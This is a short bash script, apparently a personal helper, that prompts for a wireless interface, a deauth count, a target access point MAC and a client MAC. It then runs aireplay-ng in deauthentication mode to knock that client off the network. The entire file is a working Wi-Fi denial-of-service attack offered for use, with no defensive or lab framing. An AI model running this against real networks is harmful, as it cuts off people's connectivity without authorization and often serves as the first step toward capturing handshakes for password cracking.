#! /bin/bash
# aireplay-deauth-client

echo Starting AIREPLAY-NG in AP-Client deauth mode...
echo What is the name of the wireless interface wlan0, wlan1 etc no need to input wlan0mon etc
read -p 'Interface: ' invar
echo Enter number of deauths
read -p 'Number of deauths to send: ' deauthvar
echo Enter target WiFi AP MAC
read -p 'WiFi AP: ' bssidvar
echo Enter Client MAC
read -p 'Client MAC: ' clientvar
aireplay-ng -0 $deauthvar -a $bssidvar -c $clientvar ${invar}mon
echo Deauth finished!
